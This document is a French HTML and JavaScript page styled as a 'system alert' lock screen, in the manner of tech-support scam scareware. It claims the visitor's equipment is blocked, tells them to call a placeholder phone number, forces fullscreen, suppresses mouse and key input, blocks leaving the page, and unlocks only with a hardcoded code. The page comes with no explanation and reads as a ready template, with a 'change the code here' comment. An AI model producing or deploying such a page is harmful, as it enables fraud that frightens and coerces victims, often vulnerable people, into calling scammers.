# !DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100vw;
            height: 100vh;
            background: white;
            color: black;
            font-family: Arial, sans-serif;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            padding: 5%;
        }
        .message {
            font-size: 5vw; /* Adaptatif en fonction de l'écran */
            font-weight: bold;
            text-align: center;
            width: 90%;
        }
        #codeInput {
            margin-top: 20px;
            padding: 15px;
            font-size: 3vw; /* Adaptatif */
            text-align: center;
            border: 3px solid black;
            width: 50%;
        }
        #error-message {
            color: red;
            font-size: 2vw;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <p class="message">⚠️ Votre équipement est bloqué ⚠️<br>Appelez immédiatement :</p>
        <p style="color: red; font-size: 4vw; font-weight: bold;">+33 6 XX XX XX XX</p>
        <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
        <input type="password" id="codeInput" placeholder="Code secret">
        <p id="error-message"></p>
    </div>

    <script>
        // Ouvrir en plein écran automatiquement
        function openFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen();
            }
        }
        openFullscreen();

        // Désactiver la souris et le clic droit
        document.addEventListener("contextmenu", event => event.preventDefault());
        document.addEventListener("mousemove", event => event.preventDefault());
        document.addEventListener("mousedown", event => event.preventDefault());
        document.addEventListener("mouseup", event => event.preventDefault());

        // Désactiver certaines touches (Alt+F4, F12, Escape, etc.)
        document.addEventListener("keydown", function(event) {
            if (["F12", "Escape", "Alt", "Meta", "Control", "Shift"].includes(event.key)) {
                event.preventDefault();
            }
        });

        // Empêcher de quitter la page
        window.onbeforeunload = function() {
            return "Votre équipement est bloqué, vous ne pouvez pas quitter cette page !";
        };

        // Vérifier si la fenêtre est réduite ou fermée (forcer le plein écran)
        setInterval(() => {
            if (document.hidden) {
                openFullscreen();
            }
        }, 500);

        // Code secret pour débloquer
        document.getElementById("codeInput").addEventListener("keyup", function(event) {
            if (event.key === "Enter") {
                if (this.value === "1234") {  // Change le code ici
                    document.body.innerHTML = "<h1 style='color: black; text-align: center; margin-top: 20%; font-size: 5vw;'>✅ Système restauré</h1>";
                } else {
                    document.getElementById("error-message").innerText = "Code incorrect !";
                    this.value = "";
                }
            }
        });

        // Ajustement dynamique de la taille du texte
        function adjustFontSize() {
            let screenWidth = window.innerWidth;
            let screenHeight = window.innerHeight;
            let baseSize = Math.min(screenWidth, screenHeight) * 0.05;
            document.querySelector(".message").style.fontSize = baseSize + "px";
        }
        adjustFontSize();
        window.addEventListener("resize", adjustFontSize);
    </script>

</body>
</html>deux
